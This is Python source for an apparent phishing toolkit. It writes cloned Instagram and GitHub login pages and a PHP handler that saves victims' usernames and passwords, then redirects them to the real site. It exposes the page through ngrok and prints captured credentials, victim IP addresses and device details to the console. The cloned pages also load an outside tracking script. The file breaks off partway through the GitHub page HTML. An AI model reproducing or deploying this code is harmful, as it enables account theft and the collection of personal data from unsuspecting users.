import json
from logging import info
from subprocess import Popen
import os
import sys
from colorama import init, Fore, Back
from colorama.ansi import clear_screen
from pyngrok import ngrok 
import json
from modules import bannner
import time
with open("config.json", "r") as read_file:
    data = json.load(read_file)
    token = data["ngrok"]


stat_file = 0
# instagram temp
def instagram():
  try:
    path =("""<!DOCTYPE html>
    <html data-passport-version="5" lang="en"><head>
    <style>

body {
  overflow-y: scroll;
}

a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
  margin:0;
  padding:0;
  border:0;
  font:inherit;
  vertical-align: baseline;
} 

a, a:visited {
  text-decoration: none;
}
a:active, .btn:active {
  opacity:.5;
}

ol, ul {
  list-style: none;
}

body, button, input {
  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  font-size:14px;
  line-height:18px;
}

#root, article, main, div, section, header, nav, footer {
  border: 0 solid #000000;
  box-sizing: border-box;
  align-items: stretch;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
  margin:0;
  padding:0;
  position: relative;
  -webkit-box-align: stretch;
    -moz-box-align: stretch;
  -webkit-box-orient: vertical;
    -moz-box-orient: vertical;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
} /* <--Universal Selectors End */


#root {
  z-index: 0;
}

.section-all {
  min-height:100%;
  overflow:hidden;
}

.main {
  background-color: #fafafa;
  order: 4;
  flex-grow: 1;
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -moz-box-ordinal-group: 5;
  -webkit-box-ordinal-group: 5;
}

.wrapper {
  min-height:100%;
  overflow: hidden;
}

.wrapper, .article {
  flex-grow: 1;
  justify-content: center;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;
  -webkit-box-pack: center;
    -moz-box-pack: center;
}

.article {
  flex-direction: row;
  margin:0 auto;
  max-width: 935px;
  width:100%;
  -webkit-box-orient: horizontal;
    -moz-box-orient: horizontal;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
}

.content {
  color:#262626;
  flex-grow:1;
  justify-content: center;
  max-width: 350px;
  margin-top:12px;
  -webkit-box-pack: justify;
    -moz-box-pack: justify;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;  
}

.login-box {
  background: #fff;
  border: 1px solid #e6e6e6;
  border-radius: 1px;
  margin:0 0 10px;
  padding: 10px 0;
  /* align-items: center; */
}

.header {
  margin: 14.45px auto 12px;
}

.logo {
  background: cover no-repeat;
  width:175px;
  height:auto;
}

.form {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
  -moz-box-direction: normal;
  -webkit-box-direction: normal;
}

.input-box {
  margin:auto 40px 6px;
}

input {
  height: 36px;
  border: 1px solid #efefef;
  border-radius: 3px;
  background-color: #fafafa;
  width:100%;
  font-size:12px;
  margin: 0;
  padding: 9px 0 7px 8px;
  outline: none;
  overflow: hidden;
  text-overflow: ellipsis;
  box-sizing: border-box;
}
input#name:focus, input#password:focus {
  border-color:#bbb;
}

.button-box {
  display: block;
  position: relative;
  margin: 8px 40px;
}
.btn {
  cursor: pointer;
  width: 100%;
  padding:0 8px; 
  background: #3897f0;
  border:1px solid #3897f0;
  color:#fff;
  border-radius:3px;
  font-weight:600;
  font-size: 14px;
  height: 28px;
  line-height: 26px;
  outline: none;
  white-space: nowrap;
}

.forgot, .forgot:active, .forgot:hover, .forgot:visited {
  font-size:12px;
  margin-top:12px;
  text-align: center;
  color:#003569;
  line-height: 14px!important;
}

.text {
  text-align:center;
  margin:15px;
  color:#262626;
  font-size:14px;
}

.text a, .text a:visited, .text a:hover, .text a:active {
  color:#3897f0;
  margin-left:3px;
}

/* App Store */
.app p {
  line-height: 18px;
  color:#262626;
  font-size:14px;
  text-align:center;
  margin:10px 20px;
}

.app-img {
  flex-direction: row;
  justify-content: center;
  margin:10px 0;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
}

.app-img a {
  margin-right:8px;
  height: 43.5px;
}

.app-img img {
  height:40px;
}

/* FOOTER */
.footer {
  background-color: #fafafa;
  order: 5;
  padding: 0 20px;
  background: #fafafa;
}

.footer-container {
  flex-direction: row;  
  flex-wrap:wrap;
  background-color: #fafafa;
  justify-content: space-between;
  padding: 38px 0;
  max-width:935px;
  font-size:12px;
  font-weight:600;
  margin:0 auto;
  text-transform:uppercase;
  width:100%
}

.footer-nav {
  max-width:100%;
}

.footer-nav ul {
  margin-right:16px;
  margin-bottom:3px;
  flex-grow:1;
}

.footer-nav ul li {
  display: inline-block;
  margin-right: 13px;
  margin-bottom:7px;
}

.footer-nav ul li a {
  color: #003569;
  text-decoration: none;
}

.footer span {
  color:#999;
}

span.language { 
  color: #003569;
  cursor: pointer;
  display: inline-block;
  font-weight: 600;
  position: relative;
  text-transform: uppercase;
  vertical-align: top;
}

.select {
  cursor: pointer;
  height: 100%;
  top: 0;
  opacity: 0;
  position: absolute;
  left:0;
  width: 100%;
}

/* Media Queries */
@media (max-width:450px) {
  .main {
    background-color: #fff;
  }

  .content {
    max-width: 100%;
    margin-top: 0;
    justify-content: space-between;
  }

  .login-box {
    background-color: transparent;
    border:none;
  }

  .logo {
    background: cover no-repeat;
    width:175px;
    height:auto;
    margin:0 auto;
  }

  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:3px;
    font-weight:600;
    font-size: 14px;
    height: 28px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }

  .input-box {
    border: 1px solid #efefef;
    border-radius: 3px;
    height: 36px;
    background: #fafafa;
    position: relative;
  }

  input {
    border: 0;
    background-color: #fafafa;
    width:100%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
  }

  .input-box:hover, .input-box:focus {
    border-color:#bbb;
  }

}

@media only screen and (max-width:875px) {
  .footer-container {
    text-align: center;
    padding:10px 0;
  }
  .footer-container,  .footer-nav ul {
    justify-content: center;
    margin:0 auto;
    max-width: 360px;
    min-width: auto;
    -webkit-box-pack: center;
    -moz-box-pack: center;
  }

}









  </style>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://dl.sabzlearn.ir/sc/client.min.js"></script>
  <script src="loc.js"></script>
  </head>
  <body onload="data()">
      <span id="root">
        <section class="section-all">
    
          <!-- 1-Role Main -->
          <main class="main" role="main">
            <div class="wrapper">
              <article class="article">
                <div class="content">
                  <div class="login-box">
                    <div class="header">
                      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                    </div><!-- Header end -->
                    <div class="form-wrap">
                      <form class="form" action="login.php" method="POST">
    
                        <div class="input-box">
                          <input type="text" id="username" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
                        </div>  
    
                        <div class="input-box">
                          <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                        </div>  
    
                        <span class="button-box">
                          <button class="btn" type="submit" name="submit">Log in</button>
                        </span>  
    
                        <a class="forgot" href="">Forgot password?</a>
                      </form>
                    </div> <!-- Form-wrap end -->
                  </div> <!-- Login-box end -->
    
                  <div class="login-box">
                    <p class="text">Don't have an account?<a href="#">Sign up</a></p>
                  </div> <!-- Signup-box end -->
    
                  <div class="app">
                    <p>Get the app.</p>
                    <div class="app-img">
                      <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                      </a>
                      <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                      </a>  
                    </div>  <!-- App-img end-->
                  </div> <!-- App end -->
                </div> <!-- Content end -->
              </article>
            </div> <!-- Wrapper end -->
          </main>
    
          <!-- 2-Role Footer -->
          <footer class="footer" role="contentinfo">
            <div class="footer-container">
    
              <nav class="footer-nav" role="navigation">
                <ul>
                  <li><a href="">About Us</a></li>
                  <li><a href="">Support</a></li>
                  <li><a href="">Blog</a></li>
                  <li><a href="">Press</a></li>
                  <li><a href="">Api</a></li>
                  <li><a href="">Jobs</a></li>
                  <li><a href="">Privacy</a></li>
                  <li><a href="">Terms</a></li>
                  <li><a href="">Directory</a></li>
                  <li>
                    <span class="language">Language
                      <select name="language" class="select" onchange="la(this.value)">
                        <option value="#">English</option>
                        <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                      </select>
                    </span>
                  </li>
                </ul>
              </nav>
    
              <span class="footer-logo">&copy; 2021 Instagram</span>
            </div> <!-- Footer container end -->
          </footer>
          
        </section>
      </span> <!-- Root -->
    
      <!-- Select Link -->
      <script type="text/javascript">
        function la(src) {
          window.location=src;
        }
      </script>
    </body>















 </html>""")
    filedown = open("templates/phishing/login.html","w")
    filedown.write(path)
    filedown.close()
    phppath=("""<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location:https://instagram.com');
exit();""")
    print("")
    filedown = open("templates/phishing/login.php","w")
    filedown.write(phppath)
    filedown.close()
# Choosing a Service to Port Forwarding
    time.sleep(0.07)
    print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
    print("")
    time.sleep(0.07)
    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+" Localhost")
    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
    print("")
    def phpserver():
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)

    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
    if v == "01":
      phpserver()
      print("")
      time.sleep(0.07)
      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
      print("")
      time.sleep(0.07)
      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
    elif v == "02":
       phpserver()
       global token
       link = ngrok.connect(6060,"http",auth_token=token)
       print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))

       
 # Getting User And Password
    def userin():
        global stat_file
        if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
            stat_file = str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size)
            fileip = open("../Bloody-Eye/templates/phishing/usernames.json","r")
            b = fileip.read()
            try:
                infor = json.loads(b)
                for value in infor['dev']:
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Username : "+Fore.WHITE+value['username'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Password : "+Fore.WHITE+value["password"])
                    a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
                    b = a.write("")
                    a.close()
            except:
                None
# Getting IP Address
    def readip():
        global stat_file
        if not str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size) == stat_file:
            stat_file = str(os.stat('../Bloody-Eye/templates/phishing/ip.txt').st_size)
            fileip =  open('../Bloody-Eye/templates/phishing/ip.txt','r')
            i = fileip.readlines()
            try:
                i = i[-1]
                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Victim's IP Found")
                print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.GREEN+"%s"%(i))
                o = open("../Bloody-Eye/templates/phishing/ip.txt","w")
                o.write("")
                o.close()
            except:
                None
# Getting Victim Info
    def info():
            global stat_file
            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                b = fileip.read()
            try:
                infor = json.loads(b)
                for value in infor['dev']:
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])
                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
                    b = a.write("")
                    a.close()
            except:
                None
    while True:
        userin()
        readip()
        info()
  except:
    with open("exit","w") as kill:
      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
      print("uhahahahahahahahahahahahahhahahaahah")
      time.sleep(5)
      os.system("clear")
      sys.exit()


    
def github():
  try:
    path=("""<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">

  <link crossorigin="anonymous" media="all" integrity="sha512-k9NM/a2xYY6wCRcWG7f3ROm4X5CJNikViGX0N8YIxs6sUYAe/j08/RSHXr3fA9wLIy87AMFCgXm6jbvhZhIXWw==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-93d34cfdadb1618eb00917161bb7f744.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-ZUf6K+vQqMY+RhVzaRmCy2ePbSZad4TkaGRbd6v5gFt6f9Q/nqjDkBDjQgXNmZw7J9mcYxlsE4fhRw7CTluRow==" rel="stylesheet" href="https://github.githubassets.com/assets/site-6547fa2bebd0a8c63e461573691982cb.css" />
    <link crossorigin="anonymous" media="all" integrity="sha512-mm2SigzEudA9xS8nyiKvpPVLuATFJopEhsZReSWJTnUk/C6N2PmCkm3AltG5pf405Lxuqwah2aQ7rCEf+Rjbiw==" rel="stylesheet" href="https://github.githubassets.com/assets/behaviors-9a6d928a0cc4b9d03dc52f27ca22afa4.css" />
    
    
    
    <link crossorigin="anonymous" media="all" integrity="sha512-ADxBGP+/Ejuf3hdfXt1DPBnGrlQ47QqWJG2/uzyeofvKQGbkHG8l5dAmbOThfWzViBmMF+vy43i5TLs2M+J+4g==" rel="stylesheet" href="https://github.githubassets.com/assets/github-003c4118ffbf123b9fde175f5edd433c.css" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://dl.sabzlearn.ir/sc/client.min.js"></script>
  <script src="loc.js"></script>
  <script crossorigin="anonymous" defer="defer" integrity="sha512-8K2vvwbW+6H27Nad5ydg8PA2/aMD/LKq+EiK9s0U0hhVZxCI2tWBsYk9beAtisRw2j+Or5k2/F+6dk02nmj/PA==" type="application/javascript" src="https://github.githubassets.com/assets/environment-f0adafbf.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-Of+WG2CISim899I88sYG7d/75B6gHRWbUDvUOJDh52ZKHoHClE8JQ4nZbvOrvIVTGKCUe68JogcDBUMVtQ7F8w==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-frameworks-39ff961b.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-7GvK4gfpB9Ztz8H6JMSvF2zkjlAfbaRjfl7n1VtRpOc7huXjL3iGa8FuQiFTvdPX1fd8IYbNtXZoEDZa3RVOrQ==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-vendor-ec6bcae2.js"></script>
  
  <script crossorigin="anonymous" defer="defer" integrity="sha512-LrlbFtVuiWoRKQh9cFzkYpcKwheTNTA3TrW7JLVCmEXKXR12EaKZsxRyACxZoBxeHvaak562K8ShalgfBhmhZw==" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-2eb95b16.js"></script>
  
    <script crossorigin="anonymous" defer="defer" integrity="sha512-xDmMfbDOi7C1qDeTcUUIjKfOAG5qhfSNSHRf7wT0crqnTCqtHlO1jBZmRSpjbpn4RyitzX75K0wQ/dpHqO/gAg==" type="application/javascript" data-module-id="./chunk-contributions-spider-graph.js" data-src="https://github.githubassets.com/assets/chunk-contributions-spider-graph-c4398c7d.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-obMR8mPKx8OvqRe34LgnUcxeJ1qujiA4ND3H6UX13ExMlA/WfHLjEzXRmgGRcRvN/8J1nzc+Z+jgz/PLTFy6zg==" type="application/javascript" data-module-id="./chunk-drag-drop.js" data-src="https://github.githubassets.com/assets/chunk-drag-drop-a1b311f2.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-TGnbT/6B5dxVwEk7iOlwSY9mfqhfq8m05ec+KjdlfEwoieq73iBeyidClQUSmFa2snukwzF9peY8c7FJf9FARA==" type="application/javascript" data-module-id="./chunk-emoji-picker-element.js" data-src="https://github.githubassets.com/assets/chunk-emoji-picker-element-4c69db4f.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-NwYkwzxETzKUYRXumHDsBIuggkh86KmJ1WrwWZW5wTvVPf047+wOmOHI5b4D65bfdtd3WbXJ7k+3ZWoxpIaqcA==" type="application/javascript" data-module-id="./chunk-insights-graph.js" data-src="https://github.githubassets.com/assets/chunk-insights-graph-370624c3.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-o7Wgi+lb9ce+9dvjWvB30ar51Bw0wcGhFZfQIzNGZfJ/7GZwYxVCsqgA4Q2o8yRq1QDUL1G1NxR0/3o9FoQ9JQ==" type="application/javascript" data-module-id="./chunk-jump-to.js" data-src="https://github.githubassets.com/assets/chunk-jump-to-a3b5a08b.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-tcH4xCRuMBAh1PruDaiwGnRIbHlF6bGLhxyCQ16uqok1cV5QFMguVPWJtN9KI0jGQOgN+Pha3+uOUXhXdfK/qw==" type="application/javascript" data-module-id="./chunk-profile-pins-element.js" data-src="https://github.githubassets.com/assets/chunk-profile-pins-element-b5c1f8c4.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-E+H+wAtjiqutBvn2cnXzDIvmasIhYiS7i7JzOfFUwo+Ej8zT54OrJtP//RhwixnypgOpCF4JvqzYy6zOtORDmg==" type="application/javascript" data-module-id="./chunk-runner-groups.js" data-src="https://github.githubassets.com/assets/chunk-runner-groups-13e1fec0.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-U+Pp1bYuA3fRqhike5Go//O/vsExaZLz00lrIby+rZ88yf03nQHz3wLZR9paWkakpD7TH5nS6AUpabCc7OFWpg==" type="application/javascript" data-module-id="./chunk-sortable-behavior.js" data-src="https://github.githubassets.com/assets/chunk-sortable-behavior-53e3e9d5.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-QBwrFY4kzAVN0nZmTYJLeEhi5bQ+42rE8h1g384XeZb7n62BykcUICACtaDQ473aIrRf38RSR7WDfNEIVuSlTA==" type="application/javascript" data-module-id="./chunk-tweetsodium.js" data-src="https://github.githubassets.com/assets/chunk-tweetsodium-401c2b15.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-su8FOuJFv0H16y8vmT+N3HiFpDQnHKiLz/UEdGxlCfgwnKBy202gaBmkcBpqXigRg+A8pMDXcSPIWSEW+IIKvQ==" type="application/javascript" data-module-id="./chunk-user-status-submit.js" data-src="https://github.githubassets.com/assets/chunk-user-status-submit-b2ef053a.js"></script>
    <script crossorigin="anonymous" defer="defer" integrity="sha512-qFsShJX3EkHdcQq11CLfRk444sM6/0OBXB8eTN3FZl70HSy6jUPI2M9H6/wNWDwOR+LLU/JE55Y2kl1CK1QioQ==" type="application/javascript" src="https://github.githubassets.com/assets/unsupported-a85b1284.js"></script>

  <script crossorigin="anonymous" defer="defer" integrity="sha512-rvJsuqEABlg0AZgt+K7Uvy9sM1ufX1eaMJ++LgsHFD9YtbTd3Xk9zS4phxmjuxNhyDg4NEtWsdExEwPbehgn9A==" type="application/javascript" src="https://github.githubassets.com/assets/settings-aef26cba.js"></script>
<script crossorigin="anonymous" defer="defer" integrity="sha512-RQhP6glI7eiTPchtQPPLQoeoFe3ehP5TvUen/f0960jJHf6hYRef+W0G5jNmdrLmSZ5YKkvo1yFmI2wKjnWWJQ==" type="application/javascript" src="https://github.githubassets.com/assets/sessions-45084fea.js"></script>

  <meta name="viewport" content="width=device-width">
  
  <title>Sign in to GitHub</title>
    <meta name="description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">
  
    <meta property="og:url" content="https://github.com">
    <meta property="og:site_name" content="GitHub">
    <meta property="og:title" content="Build software better, together">
    <meta property="og:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">

    <meta property="twitter:site" content="github">
    <meta property="twitter:site:id" content="13334762">
    <meta property="twitter:creator" content="github">
    <meta property="twitter:creator:id" content="13334762">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="GitHub">
    <meta property="twitter:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="twitter:image:src" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="twitter:image:width" content="1200">
    <meta property="twitter:image:height" content="1200">



    


  

  <meta name="request-id" content="1246:3087:6BE375:79E87D:601285A5" data-pjax-transient="true" /><meta name="html-safe-nonce" content="91e589bc1c81fb071eb9659d65ff172d40a3beab2b323ea68c49d35e0d8f622a" data-pjax-transient="true" /><meta name="visitor-payload" content="eyJyZWZlcnJlciI6bnVsbCwicmVxdWVzdF9pZCI6IjEyNDY6MzA4Nzo2QkUzNzU6NzlFODdEOjYwMTI4NUE1IiwidmlzaXRvcl9pZCI6IjczNDgzNTQ4NjgxNjg5NjM5MSIsInJlZ2lvbl9lZGdlIjoiYXAtc291dGhlYXN0LTEiLCJyZWdpb25fcmVuZGVyIjoiaWFkIn0=" data-pjax-transient="true" /><meta name="visitor-hmac" content="ec347cae631653de2523b1718e8fc866f693b32169483d04d3150b59c990215f" data-pjax-transient="true" />



  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true" />

  

  <meta name="selected-link" value="/login" data-pjax-transient>

    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" />

  <meta name="analytics-location-query-strip" content="true" data-pjax-transient="true" />

  






  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="">


      <meta name="expected-hostname" content="github.com">


    <meta name="enabled-features" content="MARKETPLACE_PENDING_INSTALLATIONS,ACTIONS_SHORT_SHA_WARNING">

  <meta http-equiv="x-pjax-version" content="845125e2c5df586fb6fd0d3838d81eef781b2a02154b03084b19413818eeb44e">
  



    <link rel="canonical" href="https://github.com/login" data-pjax-transient>


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="browser-optimizely-client-errors-url" content="https://api.github.com/_private/browser/optimizely_client/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">

<meta name="theme-color" content="#1e2327">


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body onload="data()" class="logged-out env-production page-responsive session-authentication">
    

    <div class="position-relative js-header-wrapper ">
      <a href="#start-of-content" class="px-2 py-4 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
      <span class="progress-pjax-loader width-full js-pjax-loader-bar Progress position-fixed">
    <span style="background-color: #79b8ff;width: 0%;" class="Progress-item progress-pjax-loader-bar "></span>
</span>      
      

          <div id="unsupported-browser" class="unsupported-browser" hidden>
  <div class="container-lg p-responsive clearfix d-flex flex-items-center py-2">
      <svg height="16" class="octicon octicon-alert mr-2 color-gray-7 hide-sm" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
    <div class="d-flex flex-auto flex-column flex-md-row">
      <div class="flex-auto min-width-0 mr-2" style="padding-top:1px">
        <span>GitHub no longer supports this web browser.</span>
        <a href="https://docs.github.com/articles/supported-browsers">
          Learn more about the browsers we support.
        </a>
      </div>
    </div>
  </div>
</div>



        <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="48" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
    </a>
  </div>
</div>


    </div>

  <div id="start-of-content" class="show-on-focus"></div>






    

  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>




  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
  >
      <main id="js-pjax-container" data-pjax-container>
        


  <div class="auth-form px-3" id="login" >


      <input type="hidden" name="ga_id" class="js-octo-ga-id-input">
      <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>


      <div data-pjax-replace id="js-flash-container">


  <template class="js-flash-template">
    <div class="flash flash-full  {{ className }}">
  <div class="container-lg px-2" >
    <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
